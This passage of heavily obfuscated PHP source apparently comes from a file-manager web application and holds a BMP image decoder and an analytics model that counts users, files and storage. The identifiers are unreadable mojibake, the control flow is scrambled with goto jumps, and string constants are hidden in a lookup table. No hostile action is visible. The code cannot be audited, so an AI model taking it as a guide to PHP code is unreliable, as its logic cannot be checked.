++$C—ÜíåãÍã, $EÌüöà¨–π += $cÛáß µ∆ó) { $BŸæ™£ãú∆ = $EÌüöà¨–π & 7; imagesetpixel($C‘ˆ¿òÒõæ, $C—ÜíåãÍã, $bêËﬂá≥Ãª, $BÉ∫ìÊå ¥[($DÌá“∫œ‰· & $A ª⁄íü∞≤ >> $BŸæ™£ãú∆) >> $E“¬ù®â∞ç - $BŸæ™£ãú∆]); } break; } } } else { for ($bãöáÍ‹ô = 0; $bãöáÍ‹ô < $f„…ãØ°¨Ö; ++$bãöáÍ‹ô, $bêËﬂá≥Ãª += $a¢¶è–∆Óú) { $aÁÇâ–ÃÇƒ = fread($FáøçËÈæ¿, $cÂÇôàá‚Î); if ($aÁÇâ–ÃÇƒ === !1) { imagedestroy($C‘ˆ¿òÒõæ); return !1; } $EÌüöà¨–π = 0; for ($C—ÜíåãÍã = 0; $C—ÜíåãÍã < $dÛªß”¯Í”; ++$C—ÜíåãÍã, $EÌüöà¨–π += $cÛáß µ∆ó) { list(, $DÌá“∫œ‰·) = unpack($d‘Ô§•ÂÜ[1439], $aÁÇâ–ÃÇƒ[$EÌüöà¨–π >> 3]); $BŸæ™£ãú∆ = $EÌüöà¨–π & 7; imagesetpixel($C‘ˆ¿òÒõæ, $C—ÜíåãÍã, $bêËﬂá≥Ãª, $BÉ∫ìÊå ¥[($DÌá“∫œ‰· & $A ª⁄íü∞≤ >> $BŸæ™£ãú∆) >> $E“¬ù®â∞ç - $BŸæ™£ãú∆]); } } } goto dŒã¶åıÛõ; c°Ü®Ìë≥≤: $C‘ˆ¿òÒõæ = imagecreate($dÛªß”¯Í”, $f„…ãØ°¨Ö); $bé»Ô¨àå¯ = $bÔˆÍ¨—¶à == 12 ? 3 : 4; $B±æòåÆÕó = $C®ñáÈ«»î ? $C®ñáÈ«»î : pow(2, $cÛáß µ∆ó); goto FÑõ¢‡»∆ø; dŒã¶åıÛõ: } else { goto Aãà»ÀÓﬂº; c¬ÕñíËï≤: $D¡∫Ñ”õÁﬂ = $cÛáß µ∆ó >> 3; $aË±Ú¿òÜñ = $c∑ù∫πÖıü ? 127 : 0; $Dâœ¡˘œ≥ƒ = $c∑ù∫πÖıü ? 1 / $c∑ù∫πÖıü : 1; goto e¢‘˘îë≠∞; Aãà»ÀÓﬂº: $C‘ˆ¿òÒõæ = imagecreatetruecolor($dÛªß”¯Í”, $f„…ãØ°¨Ö); imagealphablending($C‘ˆ¿òÒõæ, !1); if ($c∑ù∫πÖıü) { imagesavealpha($C‘ˆ¿òÒõæ, !0); } goto c¬ÕñíËï≤; e¢‘˘îë≠∞: $BŒèçÍß∞à = $a≠®âûúáÏ ? 1 / $a≠®âûúáÏ : 1; $cÀœ ∏ˆ∆Ó = $cì»©√ìëÿ ? 1 / $cì»©√ìëÿ : 1; $Bë»Ó®ãùı = $aî¡∏Û•ç˜ ? 1 / $aî¡∏Û•ç˜ : 1; goto E√ÊÑﬁÖÑ∆; E√ÊÑﬁÖÑ∆: for ($bãöáÍ‹ô = 0; $bãöáÍ‹ô < $f„…ãØ°¨Ö; ++$bãöáÍ‹ô, $bêËﬂá≥Ãª += $a¢¶è–∆Óú) { $aÁÇâ–ÃÇƒ = fread($FáøçËÈæ¿, $cÂÇôàá‚Î); if ($aÁÇâ–ÃÇƒ === !1) { imagedestroy($C‘ˆ¿òÒõæ); return !1; } $EÌüöà¨–π = 0; for ($C—ÜíåãÍã = 0; $C—ÜíåãÍã < $dÛªß”¯Í”; ++$C—ÜíåãÍã, $EÌüöà¨–π += $D¡∫Ñ”õÁﬂ) { list(, $DÌá“∫œ‰·) = unpack($d‘Ô§•ÂÜ[1416], substr($aÁÇâ–ÃÇƒ, $EÌüöà¨–π, $D¡∫Ñ”õÁﬂ) . $d‘Ô§•ÂÜ[1440]); $Bö´ﬂªπÔÒ = $DÌá“∫œ‰· & $c∑ù∫πÖıü; $Eâ´Ò„»„ú = $DÌá“∫œ‰· & $a≠®âûúáÏ; $dıø∏›ë”¶ = $DÌá“∫œ‰· & $cì»©√ìëÿ; $fâìµâÍ¿» = $DÌá“∫œ‰· & $aî¡∏Û•ç˜; $Fçç ‡ﬂŒ± = $aË±Ú¿òÜñ - (($Bö´ﬂªπÔÒ << 7) - $Bö´ﬂªπÔÒ) * $Dâœ¡˘œ≥ƒ; $Bèàú¡Ω‘ = (($Eâ´Ò„»„ú << 8) - $Eâ´Ò„»„ú) * $BŒèçÍß∞à; $fß–í˘∑µ◊ = (($dıø∏›ë”¶ << 8) - $dıø∏›ë”¶) * $cÀœ ∏ˆ∆Ó; $BŸæ™£ãú∆ = (($fâìµâÍ¿» << 8) - $fâìµâÍ¿») * $Bë»Ó®ãùı; imagesetpixel($C‘ˆ¿òÒõæ, $C—ÜíåãÍã, $bêËﬂá≥Ãª, $Fçç ‡ﬂŒ± << 24 | $Bèàú¡Ω‘ << 16 | $fß–í˘∑µ◊ << 8 | $BŸæ™£ãú∆); } } imagealphablending($C‘ˆ¿òÒõæ, !0); goto câÛâçÊŸœ; câÛâçÊŸœ: } return $C‘ˆ¿òÒõæ; goto aßÌò’Ûéë; Eë¿ÌÿöÑÂ: if ($dÛªß”¯Í” == 0 || $A®·¢Ö®—Ã == 0 || $fØÉ÷ÉÇœ€ != 1 || ($c∑ù∫πÖıü & $a≠®âûúáÏ) != 0 || ($c∑ù∫πÖıü & $cì»©√ìëÿ) != 0 || ($c∑ù∫πÖıü & $aî¡∏Û•ç˜) != 0 || ($a≠®âûúáÏ & $cì»©√ìëÿ) != 0 || ($a≠®âûúáÏ & $aî¡∏Û•ç˜) != 0 || ($cì»©√ìëÿ & $aî¡∏Û•ç˜) != 0) { return !1; } if ($Cªçêà•Ì◊ == 4 || $Cªçêà•Ì◊ == 5) { $aÁÇâ–ÃÇƒ = stream_get_contents($FáøçËÈæ¿, $dÉ≈ß—äÇÍ); if ($aÁÇâ–ÃÇƒ === !1) { return !1; } return imagecreatefromstring($aÁÇâ–ÃÇƒ); } $cÂÇôàá‚Î = $dÛªß”¯Í” * $cÛáß µ∆ó + 31 >> 3 & ~3; goto b‡‚¬◊Òï‚; A≤†ä»∆öœ: $d‘Ô§•ÂÜ =& $_SERVER[∞„˜ƒÑºª]; if ($cÏÏ·¶¯çÚ[$d‘Ô§•ÂÜ[792]] != 19778) { return !1; } $aÁÇâ–ÃÇƒ = fread($FáøçËÈæ¿, 4); goto b—”ø„ùœè; b—”ø„ùœè: if ($aÁÇâ–ÃÇƒ === !1) { return !1; } list(, $bÔˆÍ¨—¶à) = unpack($d‘Ô§•ÂÜ[1416], $aÁÇâ–ÃÇƒ); if ($bÔˆÍ¨—¶à == 12) { goto e€Êœ“«ëº; fÚ˘Î¿™Ë≥: $aî¡∏Û•ç˜ = 255; goto aøß¨øê®Ë; e€Êœ“«ëº: $aÁÇâ–ÃÇƒ = fread($FáøçËÈæ¿, $bÔˆÍ¨—¶à - 4); if ($aÁÇâ–ÃÇƒ === !1) { return !1; } extract(unpack($d‘Ô§•ÂÜ[1417] . $d‘Ô§•ÂÜ[1418] . $d‘Ô§•ÂÜ[1419] . $d‘Ô§•ÂÜ[1420], $aÁÇâ–ÃÇƒ)); goto d’Ã·ÈÔ⁄î; d’Ã·ÈÔ⁄î: $C®ñáÈ«»î = $fÃ⁄ö∆èÈ• = $c∑ù∫πÖıü = $Cªçêà•Ì◊ = 0; $a≠®âûúáÏ = 16711680; $cì»©√ìëÿ = 65280; goto fÚ˘Î¿™Ë≥; aøß¨øê®Ë: } else { if (124 < $bÔˆÍ¨—¶à || $bÔˆÍ¨—¶à < 40) { return !1; } else { goto A˘´¥∂ºÇˆ; A˘´¥∂ºÇˆ: $aÁÇâ–ÃÇƒ = fread($FáøçËÈæ¿, 36); if ($aÁÇâ–ÃÇƒ === !1) { return !1; } extract(unpack($d‘Ô§•ÂÜ[1421] . $d‘Ô§•ÂÜ[1422] . $d‘Ô§•ÂÜ[1419] . $d‘Ô§•ÂÜ[1423] . $d‘Ô§•ÂÜ[1424] . $d‘Ô§•ÂÜ[1425] . $d‘Ô§•ÂÜ[1426] . $d‘Ô§•ÂÜ[1427] . $d‘Ô§•ÂÜ[1428] . $d‘Ô§•ÂÜ[1429], $aÁÇâ–ÃÇƒ)); goto BÈà†Ü∫îﬁ; DóÆãôÇÂÇ: if ($cÏê¢—ãô“ & 2147483648) { $cÏê¢—ãô“ = -(~$cÏê¢—ãô“ & 4294967295) - 1; } if ($cÏÏ·¶¯çÚ[$d‘Ô§•ÂÜ[391]] != 0) { $Dä–ôíΩ Ø = $cÛáß µ∆ó == 1 || $cÛáß µ∆ó == 4 || $cÛáß µ∆ó == 8 ? ($C®ñáÈ«»î ? $C®ñáÈ«»î : pow(2, $cÛáß µ∆ó)) << 2 : 0; $b‘€¥Üµ°î = $dÉ≈ß—äÇÍ ? $dÉ≈ß—äÇÍ : ($dÛªß”¯Í” * $cÛáß µ∆ó + 31 >> 3 & ~3) * abs($A®·¢Ö®—Ã); $CæΩê‚√ê = $cÏÏ·¶¯çÚ[$d‘Ô§•ÂÜ[391]] - $b‘€¥Üµ°î - $Dä–ôíΩ Ø - 14; if ($bÔˆÍ¨—¶à < $CæΩê‚√ê && 40 <= $bÔˆÍ¨—¶à && $bÔˆÍ¨—¶à <= 124) { $bÔˆÍ¨—¶à = $CæΩê‚√ê; } } if ($bÔˆÍ¨—¶à - 40 > 0) { $aÁÇâ–ÃÇƒ = fread($FáøçËÈæ¿, $bÔˆÍ¨—¶à - 40); if ($aÁÇâ–ÃÇƒ === !1) { return !1; } extract(unpack($d‘Ô§•ÂÜ[1430] . $d‘Ô§•ÂÜ[1431] . $d‘Ô§•ÂÜ[1432] . $d‘Ô§•ÂÜ[1433], $aÁÇâ–ÃÇƒ . str_repeat($d‘Ô§•ÂÜ[1434], 120))); } else { $c∑ù∫πÖıü = $a≠®âûúáÏ = $cì»©√ìëÿ = $aî¡∏Û•ç˜ = 0; } goto BÚ¿˜ÀÇØ™; BÚ¿˜ÀÇØ™: if (($cÛáß µ∆ó == 16 || $cÛáß µ∆ó == 24 || $cÛáß µ∆ó == 32) && $Cªçêà•Ì◊ == 0 && $a≠®âûúáÏ == 0 && $cì»©√ìëÿ == 0 && $aî¡∏Û•ç˜ == 0) { switch ($cÛáß µ∆ó) { case 16: $a≠®âûúáÏ = 31744; $cì»©√ìëÿ = 992; $aî¡∏Û•ç˜ = 31; break; case 24: case 32: $a≠®âûúáÏ = 16711680; $cì»©√ìëÿ = 65280; $aî¡∏Û•ç˜ = 255; break; } } goto d‡ŸìóÓîØ; BÈà†Ü∫îﬁ: if ($dÛªß”¯Í” & 2147483648) { $dÛªß”¯Í” = -(~$dÛªß”¯Í” & 4294967295) - 1; } if ($A®·¢Ö®—Ã & 2147483648) { $A®·¢Ö®—Ã = -(~$A®·¢Ö®—Ã & 4294967295) - 1; } if ($dëÔç» ΩØ & 2147483648) { $dëÔç» ΩØ = -(~$dëÔç» ΩØ & 4294967295) - 1; } goto DóÆãôÇÂÇ; d‡ŸìóÓîØ: } } goto Eë¿ÌÿöÑÂ; b‡‚¬◊Òï‚: $f„…ãØ°¨Ö = abs($A®·¢Ö®—Ã); $bêËﬂá≥Ãª = $A®·¢Ö®—Ã > 0 ? $f„…ãØ°¨Ö - 1 : 0; $a¢¶è–∆Óú = $A®·¢Ö®—Ã > 0 ? -1 : 1; goto f≠á‘≈ªéø; aßÌò’Ûéë: } } class AnalysisModel extends ModelBaseLight { public function init($eÕ—éŒÌô∑) { $eàÀà€¡’Ì =& $_SERVER[∞„˜ƒÑºª]; $dß°€àáΩÔ = array($eàÀà€¡’Ì[415] => array($eàÀà€¡’Ì[29] => $eàÀà€¡’Ì[1441], $eàÀà€¡’Ì[260] => array($eàÀà€¡’Ì[213], $eàÀà€¡’Ì[456], $eàÀà€¡’Ì[1442], $eàÀà€¡’Ì[1443])), $eàÀà€¡’Ì[1444] => array($eàÀà€¡’Ì[29] => $eàÀà€¡’Ì[1445], $eàÀà€¡’Ì[260] => array($eàÀà€¡’Ì[213], $eàÀà€¡’Ì[454], $eàÀà€¡’Ì[1446], $eàÀà€¡’Ì[1447], $eàÀà€¡’Ì[1448]))); if (!isset($dß°€àáΩÔ[$eÕ—éŒÌô∑])) { return !1; } $this->optionType = $dß°€àáΩÔ[$eÕ—éŒÌô∑][$eàÀà€¡’Ì[29]]; $this->field = $dß°€àáΩÔ[$eÕ—éŒÌô∑][$eàÀà€¡’Ì[260]]; return !0; } public function listData($d©Âÿ’√í• = false, $f¶£º®∂á‘ = "\155\157\x64\151\146\171\x54\151\x6d\145", $aÓèŒÜÒòﬁ = false) { return parent::listData($d©Âÿ’√í•, $f¶£º®∂á‘, $aÓèŒÜÒòﬁ); } public function trendList($C•£ì¬≠î) { goto a‘®äÁÇ≤Ë; eπ¨ˆ†ëçÓ: foreach ($cèˆÍ’Ö’õ as $A´ñ˘ßﬂÏ√) { $this->{$bµûÊßÌû∂}($A´ñ˘ßﬂÏ√); } return $this->listData(); goto DÍ⁄ÖƒÏ≤–; DóåË∏ÎÌ«: if (!isset($c¨π…Üê¢®)) { $A…Õ©û´ãÉ = $C•£ì¬≠î == $F¿≥⁄ûﬁóÇ[415] ? $F¿≥⁄ûﬁóÇ[1451] : $F¿≥⁄ûﬁóÇ[520]; $c¨π…Üê¢® = Model($A…Õ©û´ãÉ)->min($F¿≥⁄ûﬁóÇ[183]); } $bµûÊßÌû∂ = $F¿≥⁄ûﬁóÇ[1452] . ucfirst($C•£ì¬≠î); $cèˆÍ’Ö’õ = $this->dateList($c¨π…Üê¢®); goto eπ¨ˆ†ëçÓ; a‘®äÁÇ≤Ë: $F¿≥⁄ûﬁóÇ =& $_SERVER[∞„˜ƒÑºª]; $cè≤âôô÷± = $this->listData(); if ($cè≤âôô÷±) { $aü¥®Ûå˜ª = end($cè≤âôô÷±); $A´ñ˘ßﬂÏ√ = date($F¿≥⁄ûﬁóÇ[1449], strtotime($F¿≥⁄ûﬁóÇ[1450])); if ($aü¥®Ûå˜ª[$F¿≥⁄ûﬁóÇ[213]] == $A´ñ˘ßﬂÏ√) { return $cè≤âôô÷±; } $c¨π…Üê¢® = strtotime($aü¥®Ûå˜ª[$F¿≥⁄ûﬁóÇ[213]]); } goto DóåË∏ÎÌ«; DÍ⁄ÖƒÏ≤–: } private function dateList($bæﬂ˜œÔﬂ•) { $BŒÖñó„¢û =& $_SERVER[∞„˜ƒÑºª]; $dÏ›êù¶Ùó = $bæﬂ˜œÔﬂ•; $cóçÃ∏‰®∫ = strtotime($BŒÖñó„¢û[1450]); $dïﬂ›•‰Ù⁄ = array(); while ($dÏ›êù¶Ùó <= $cóçÃ∏‰®∫) { $dïﬂ›•‰Ù⁄[] = date($BŒÖñó„¢û[1449], $dÏ›êù¶Ùó); $dÏ›êù¶Ùó = strtotime($BŒÖñó„¢û[1453], $dÏ›êù¶Ùó); } return $dïﬂ›•‰Ù⁄; } public function _recordUser($C€∏Ëò√úá = '') { goto f–œ†„‰¡‡; bﬂ÷ﬁƒÍ¢ô: $EäÑêΩÌ–€ = Model($aÊÀ√ëÈÎ‹[1451])->where($c‘œ≤ôÚëÛ)->count($aÊÀ√ëÈÎ‹[1063]); $c‘œ≤ôÚëÛ[$aÊÀ√ëÈÎ‹[29]] = $aÊÀ√ëÈÎ‹[1456]; $F˜Ø¥û≤êÆ = Model($aÊÀ√ëÈÎ‹[1457])->where($c‘œ≤ôÚëÛ)->count($aÊÀ√ëÈÎ‹[1458]); goto A˘Ö´∞Ëáﬂ; BŸ·Ú¿çä¿: $c‘œ≤ôÚëÛ = array($aÊÀ√ëÈÎ‹[183] => array($aÊÀ√ëÈÎ‹[687], $bÁ’®á†©)); $dﬂ¨Ïéß©™ = Model($aÊÀ√ëÈÎ‹[1451])->where($c‘œ≤ôÚëÛ)->count($aÊÀ√ëÈÎ‹[1063]); $c‘œ≤ôÚëÛ[$aÊÀ√ëÈÎ‹[183]] = array($aÊÀ√ëÈÎ‹[320], array($d∞—èõËì©, $bÁ’®á†©)); goto bﬂ÷ﬁƒÍ¢ô; A˘Ö´∞Ëáﬂ: $eÎÑ‘™◊€◊ = array($aÊÀ√ëÈÎ‹[213] => $C€∏Ëò√úá, $aÊÀ√ëÈÎ‹[456] => (int) $dﬂ¨Ïéß©™, $aÊÀ√ëÈÎ‹[1442] => (int) $EäÑêΩÌ–€, $aÊÀ√ëÈÎ‹[1443] => (int) $F˜Ø¥û≤êÆ); return $this->insert($eÎÑ‘™◊€◊); goto EÂ’◊¯ò÷; f–œ†„‰¡‡: $aÊÀ√ëÈÎ‹ =& $_SERVER[∞„˜ƒÑºª]; $d∞—èõËì© = strtotime(date($aÊÀ√ëÈÎ‹[1454], strtotime($C€∏Ëò√úá))); $bÁ’®á†© = strtotime(date($aÊÀ√ëÈÎ‹[1455], strtotime($C€∏Ëò√úá))); goto BŸ·Ú¿çä¿; EÂ’◊¯ò÷: } public function _recordStore($F›Öä∑“∫ﬂ = '') { goto Aúı¡≥‹Ã÷; E±ØÂ÷©‹◊: $B«Õ√ÛÛ›í[$B÷–‰ÜùÚˆ[393]] = 1; $Dúçß†Ê„ÿ = Model($B÷–‰ÜùÚˆ[520])->where($B«Õ√ÛÛ›í)->sum($B÷–‰ÜùÚˆ[86]); $B«Õ√ÛÛ›í[$B÷–‰ÜùÚˆ[393]] = 2; goto açπç™âÀ•; açπç™âÀ•: $c◊ﬂóòô¨è = Model($B÷–‰ÜùÚˆ[520])->where($B«Õ√ÛÛ›í)->sum($B÷–‰ÜùÚˆ[86]); $eﬂÆª•Ø·Ò = array($B÷–‰ÜùÚˆ[213] => $F›Öä∑“∫ﬂ, $B÷–‰ÜùÚˆ[454] => (int) $fÖãî©ƒ¨º, $B÷–‰ÜùÚˆ[1446] => (int) $còæ¶◊ë•§, $B÷–‰ÜùÚˆ[1447] => (int) $Dúçß†Ê„ÿ, $B÷–‰ÜùÚˆ[1448] => (int) $c◊ﬂóòô¨è); return $this->insert($eﬂÆª•Ø·Ò); goto E—ªêœÁÁÔ; c˘¨°Òïœ±: $còæ¶◊ë•§ = Model($B÷–‰ÜùÚˆ[1459])->where($B«Õ√ÛÛ›í)->sum($B÷–‰ÜùÚˆ[86]); $B«Õ√ÛÛ›í[$B÷–‰ÜùÚˆ[375]] = 0; $fÖãî©ƒ¨º = Model($B÷–‰ÜùÚˆ[520])->where($B«Õ√ÛÛ›í)->sum($B÷–‰ÜùÚˆ[86]); goto E±ØÂ÷©‹◊; Aúı¡≥‹Ã÷: $B÷–‰ÜùÚˆ =& $_SERVER[∞„˜ƒÑºª]; $e£Â√â Çà = strtotime(date($B÷–‰ÜùÚˆ[1455], strtotime($F›Öä∑“∫ﬂ))); $B«Õ√ÛÛ›í = array($B÷–‰ÜùÚˆ[183] => array($B÷–‰ÜùÚˆ[687], $e£Â√â Çà)); goto c˘¨°Òïœ±; E—ªêœÁÁÔ: } public function trend($cùü„àäÒû, $E‡⁄‡·Æã’) { goto AåπÏâÆé›; AåπÏâÆé›: $AáªØ§ÿπã =& $_SERVER[∞„˜ƒÑºª]; if (!$this->init($cùü„àäÒû)) { return !1; } $bí˜ÿÜë≤ÿ = $this->trendList($cùü„àäÒû); goto Aç©¿ÌÇ¨Â; fã∞â˜Ìíô: return $b€‚“Ω≥Ñ˘; goto C¯Öã‰ÿ≠ç; Cæë –òı‚: if (empty($bí˜ÿÜë≤ÿ)) { $fñâË˜ú≥‚ = date($AáªØ§ÿπã[1449], strtotime($AáªØ§ÿπã[1450])); $dÇÀ‚âäã˘ = array($AáªØ§ÿπã[213] => $fñâË˜ú≥‚); foreach ($c¡‡ãç◊ÇÉ[$cùü„àäÒû] as $Bä˜ü—âÍã => $FπÃ£ÒÇ¨—) { $dÇÀ‚âäã˘[$Bä˜ü—âÍã] = 0; } $bí˜ÿÜë≤ÿ[] = $dÇÀ‚âäã˘; } $b€‚“Ω≥Ñ˘ = array(); foreach ($bí˜ÿÜë≤ÿ as $FπÃ£ÒÇ¨—) { if ($cùü„àäÒû == $AáªØ§ÿπã[1444] && $FπÃ£ÒÇ¨—[$AáªØ§ÿπã[1446]] > $FπÃ£ÒÇ¨—[$AáªØ§ÿπã[454]]) { $FπÃ£ÒÇ¨—[$AáªØ§ÿπã[1446]] = $FπÃ£ÒÇ¨—[$AáªØ§ÿπã[454]]; } foreach ($c¡‡ãç◊ÇÉ[$cùü„àäÒû] as $Bä˜ü—âÍã => $C°∂ÿ€›ìå) { $B†æÚ⁄“≈∆ = array($AáªØ§ÿπã[213] => $FπÃ£ÒÇ¨—[$AáªØ§ÿπã[213]], $AáªØ§ÿπã[973] => $C°∂ÿ€›ìå); $B†æÚ⁄“≈∆[$BﬂüæÚÎﬂƒ[$cùü„àäÒû]] = isset($FπÃ£ÒÇ¨—[$Bä˜ü—âÍã]) ? $FπÃ£ÒÇ¨—[$Bä˜ü—âÍã] : 0; $b€‚“Ω≥Ñ˘[] = $B†æÚ⁄“≈∆; } } goto fã∞â˜Ìíô; Aç©¿ÌÇ¨Â: if ($bí˜ÿÜë≤ÿ && $E‡⁄‡·Æã’ != $AáªØ§ÿπã[1038]) { $eüÿ≥¶’Ï— = $bí˜ÿÜë≤ÿ[0][$AáªØ§ÿπã[213]]; $Bïµ§æ”áç = $this->validDate($E‡⁄‡·Æã’, $eüÿ≥¶’Ï—); $cÌòöÛ∑πÜ = array(); $F®¢êıØ¿ä = array_to_keyvalue($bí˜ÿÜë≤ÿ, $AáªØ§ÿπã[213]); foreach ($Bïµ§æ”áç as $fñâË˜ú≥‚) { if (isset($F®¢êıØ¿ä[$fñâË˜ú≥‚])) { $B†æÚ⁄“≈∆ = $F®¢êıØ¿ä[$fñâË˜ú≥‚]; } else { $B†æÚ⁄“≈∆ = end($bí˜ÿÜë≤ÿ); $B†æÚ⁄“≈∆[$AáªØ§ÿπã[213]] = $fñâË˜ú≥‚; if ($cùü„àäÒû == $AáªØ§ÿπã[415]) { $B†æÚ⁄“≈∆[$AáªØ§ÿπã[1442]] = $B†æÚ⁄“≈∆[$AáªØ§ÿπã[1443]] = 0; } } $cÌòöÛ∑πÜ[] = $B†æÚ⁄“≈∆; } $bí˜ÿÜë≤ÿ = $cÌòöÛ∑πÜ; } $c¡‡ãç◊ÇÉ = array($AáªØ§ÿπã[415] => array($AáªØ§ÿπã[456] => LNG($AáªØ§ÿπã[1460]), $AáªØ§ÿπã[1442] => LNG($AáªØ§ÿπã[1461]), $AáªØ§ÿπã[1443] => LNG($AáªØ§ÿπã[1462])), $AáªØ§ÿπã[1444] => array($AáªØ§ÿπã[454] => LNG($AáªØ§ÿπã[1463]), $AáªØ§ÿπã[1446] => LNG($AáªØ§ÿπã[1464]), $AáªØ§ÿπã[1447] => LNG($AáªØ§ÿπã[1465]), $AáªØ§ÿπã[1448] => LNG($AáªØ§ÿπã[1466]))); $BﬂüæÚÎﬂƒ = array($AáªØ§ÿπã[415] => $AáªØ§ÿπã[1467], $AáªØ§ÿπã[1444] => $AáªØ§ÿπã[86]); goto Cæë –òı‚; C¯Öã‰ÿ≠ç: } public function validDate($f„É±¿‹ç, $F¥◊≤π§îΩ) { goto C≤Â»©Àåì; C≤Â»©Àåì: $DÜæ‚≥à¡ı =& $_SERVER[∞„˜ƒÑºª]; $BÃÚíÇ‹äŸ = date($DÜæ‚≥à¡ı[1449], strtotime($DÜæ‚≥à¡ı[1450])); $E«¬◊…“ºÎ = array($BÃÚíÇ‹äŸ); goto E¢∫œó¬Öè; d⁄é¿ô∆›â: return $E«¬◊…“ºÎ; goto cºè€ΩÓÈÕ; E¢∫œó¬Öè: switch ($f„É±¿‹ç) { case $DÜæ‚≥à¡ı[1045]: $FÜ›á¡ê¶Ê = mktime(0, 0, 0, date($DÜæ‚≥à¡ı[1468]), date($DÜæ‚≥à¡ı[1469]) - date($DÜæ‚≥à¡ı[934]) + 7 - 7, date($DÜæ‚≥à¡ı[1470])); $DÊåò≥∫®¬ = 0; do { $Eü≥ûÃÕÃ€ = date($DÜæ‚≥à¡ı[1449], $FÜ›á¡ê¶Ê - 3600 * 24 * 7 * $DÊåò≥∫®¬); $E«¬◊…“ºÎ[] = $Eü≥ûÃÕÃ€; $DÊåò≥∫®¬++; } while ($F¥◊≤π§îΩ < $Eü≥ûÃÕÃ€); break; case $DÜæ‚≥à¡ı[1043]: $DÊåò≥∫®¬ = 1; do { $DÀﬂ†›Î≠∫ = date($DÜæ‚≥à¡ı[1471], strtotime("\x2d\x20{$DÊåò≥∫®¬}\40\155\x6f\156\164\x68\x73")); $E«¬◊…“ºÎ[] = $DÀﬂ†›Î≠∫; $DÊåò≥∫®¬++; } while ($F¥◊≤π§îΩ < $DÀﬂ†›Î≠∫); break; case $DÜæ‚≥à¡ı[1402]: $aÖáœ£Ì‡Ÿ = (int) date($DÜæ‚≥à¡ı[1470], strtotime($F¥◊≤π§îΩ)); $e”¿æÒë√¯ = (int) date($DÜæ‚≥à¡ı[1470]); if ($aÖáœ£Ì‡Ÿ >= $e”¿æÒë√¯) { break; } for ($aÖáœ£Ì‡Ÿ; $aÖáœ£Ì‡Ÿ < $e”¿æÒë√¯; $aÖáœ£Ì‡Ÿ++) { $E«¬◊…“ºÎ[] = $aÖáœ£Ì‡Ÿ . $DÜæ‚≥à¡ı[1472]; } break; default: break; } if ($F¥◊≤π§îΩ > end($E«¬◊…“ºÎ)) { array_pop($E«¬◊…“ºÎ); } sort($E«¬◊…“ºÎ); goto d⁄é¿ô∆›â; cºè€ΩÓÈÕ: } public function listTable($Eèâ⁄™ÑπÊ) { $BƒŸä£”ü® = ucfirst($Eèâ⁄™ÑπÊ); return Model($BƒŸä£”ü®)->listData(); } public function option($fåäÂ∑¡Û±) { $e™‘ŒÉµÌÆ = $_SERVER[∞„˜ƒÑºª][1473] . ucfirst($fåäÂ∑¡Û±); return $this->{$e™‘ŒÉµÌÆ}(); } private function optionUser() { goto A°ô˘¿ãÎ‡; Fõ’ˆ”¶·Ò: $a¿í≈¢¥“£ = strtotime($BÁë¨û¨¬Ω[1475]); $eÑè⁄Â¿œ‚ = array($BÁë¨û¨¬Ω[1476] => array($BÁë¨û¨¬Ω[688], $a¿í≈¢¥“£)); $D∆Öâª©é¥ = (int) Model($BÁë¨û¨¬Ω[1451])->where($eÑè⁄Â¿œ‚)->count($BÁë¨û¨¬Ω[1063]); goto e˘¨®˘ñè¯; e¶ÇØ‡ëä£: $FÁÉôΩ”ßê = Model($BÁë¨û¨¬Ω[1451])->where($eÑè⁄Â¿œ‚)->count($BÁë¨û¨¬Ω[1063]); return array($BÁë¨û¨¬Ω[451] => (int) $C›”∆ÇÑªö, $BÁë¨û¨¬Ω[1477] => (int) ($C›”∆ÇÑªö - $aæ‘°Œ— ê), $BÁë¨û¨¬Ω[1478] => (int) $aæ‘°Œ— ê, $BÁë¨û¨¬Ω[1479] => (int) $FÁÉôΩ”ßê, $BÁë¨û¨¬Ω[1480] => $D∆Öâª©é¥); goto D⁄∑ÚŒòÂ◊; e˘¨®˘ñè¯: if (!$D∆Öâª©é¥) { $D∆Öâª©é¥ = 1; } $a¿í≈¢¥“£ = strtotime(date($BÁë¨û¨¬Ω[1454])); $eÑè⁄Â¿œ‚ = array($BÁë¨û¨¬Ω[1476] => array($BÁë¨û¨¬Ω[688], $a¿í≈¢¥“£)); goto e¶ÇØ‡ëä£; A°ô˘¿ãÎ‡: $BÁë¨û¨¬Ω =& $_SERVER[∞„˜ƒÑºª]; $C›”∆ÇÑªö = Model($BÁë¨û¨¬Ω[1451])->count($BÁë¨û¨¬Ω[1063]); $aæ‘°Œ— ê = Model($BÁë¨û¨¬Ω[1451])->where($BÁë¨û¨¬Ω[1474])->count($BÁë¨û¨¬Ω[1063]); goto Fõ’ˆ”¶·Ò; D⁄∑ÚŒòÂ◊: } private function optionFile() { goto dÑÃ¶ÿáŒ≠; dÑÃ¶ÿáŒ≠: $FÕ»ó§µ¯€ =& $_SERVER[∞„˜ƒÑºª]; $C¿¬É©â›ò = $this->sourceSize(); $a¨ıãˆ∆æ˜ = $C¿¬É©â›ò[$FÕ»ó§µ¯€[86]]; goto d…ºãõ†ÏŸ; d…ºãõ†ÏŸ: $b‰∑ÚÚÒ…‹ = $C¿¬É©â›ò[$FÕ»ó§µ¯€[1446]]; $DÙ∫≥Ö¢Ã∞ = Model($FÕ»ó§µ¯€[520])->where(array($FÕ»ó§µ¯€[375] => 0))->count($FÕ»ó§µ¯€[374]); $D∑Ú¥»èÛâ = array($FÕ»ó§µ¯€[375] => 0, $FÕ»ó§µ¯€[183] => array($FÕ»ó§µ¯€[688], strtotime(date($FÕ»ó§µ¯€[1454])))); goto E«ÓüÚ«¨µ; E«ÓüÚ«¨µ: $fàÀÖç¥å∏ = Model($FÕ»ó§µ¯€[520])->where($D∑Ú¥»èÛâ)->sum($FÕ»ó§µ¯€[86]); $B†ö¬ˆﬂ≥™ = Model($FÕ»ó§µ¯€[520])->where($D∑Ú¥»èÛâ)->count($FÕ»ó§µ¯€[374]); return array($FÕ»ó§µ¯€[454] => $a¨ıãˆ∆æ˜, $FÕ»ó§µ¯€[1446] => $b‰∑ÚÚÒ…‹, $FÕ»ó§µ¯€[1481] => $a¨ıãˆ∆æ˜ - $b‰∑ÚÚÒ…‹, $FÕ»ó§µ¯€[1482] => (int) $fàÀÖç¥å∏, $FÕ»ó§µ¯€[456] => (int) $DÙ∫≥Ö¢Ã∞, $FÕ»ó§µ¯€[1483] => (int) $B†ö¬ˆﬂ≥™); goto Dê„ÃÎìë…; Dê„ÃÎìë…: } private function optionAccess() { $fÙàâõ´ÿ‡ =& $_SERVER[∞„˜ƒÑºª]; return array($fÙàâõ´ÿ‡[451] => $this->typeLogCnt(), 